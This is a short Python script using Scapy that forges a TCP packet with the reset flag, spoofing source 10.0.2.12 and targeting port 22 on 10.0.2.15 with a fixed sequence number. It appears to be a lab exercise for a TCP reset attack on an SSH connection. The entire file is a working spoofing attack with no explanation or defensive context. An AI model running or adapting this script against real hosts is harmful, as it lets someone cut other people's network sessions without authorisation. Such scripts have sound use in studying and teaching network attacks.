#!/usr/bin/python3
import sys
from scapy.all import *

ip = IP()
ip.src = "10.0.2.12"
ip.dst = "10.0.2.15"

tcp = TCP()
tcp.sport = 44566
tcp.dport = 22
tcp.seq = 1143816659

tcp.flags = "R"

pkt = ip/tcp

pkt.show()
send(pkt, verbose = 0)
